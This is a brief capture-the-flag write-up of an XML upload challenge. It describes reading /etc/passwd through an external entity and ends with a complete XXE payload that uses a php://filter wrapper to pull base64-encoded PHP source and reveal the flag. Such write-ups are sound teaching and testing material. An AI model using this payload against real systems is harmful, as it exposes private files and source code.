**I think this challenge not hard it is easy or medium**


**we have xml upload function which disblay the content of the xml file**
![Screenshot_20231003_103841](https://github.com/kiro6/writeups-ctfs/assets/57776872/81da4bce-6395-45e0-ac8e-5f81fe1894d9)

**tried to include /etc/passwd and it works**  
![Screenshot_20231003_103822](https://github.com/kiro6/writeups-ctfs/assets/57776872/fcdc3b3d-1702-410b-8828-a3528f052a14)

**using php filter wrapper i was able to read source code in Base64 encode**
![Screenshot_20231003_103756](https://github.com/kiro6/writeups-ctfs/assets/57776872/72e77e1b-8555-4a21-931b-0ab0340de04d)


**decode Base64 to find the flag**

```php
<?php
$flag = 'xeeflag345';
```

**final payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ 
 <!ENTITY content SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&content;</root>
```
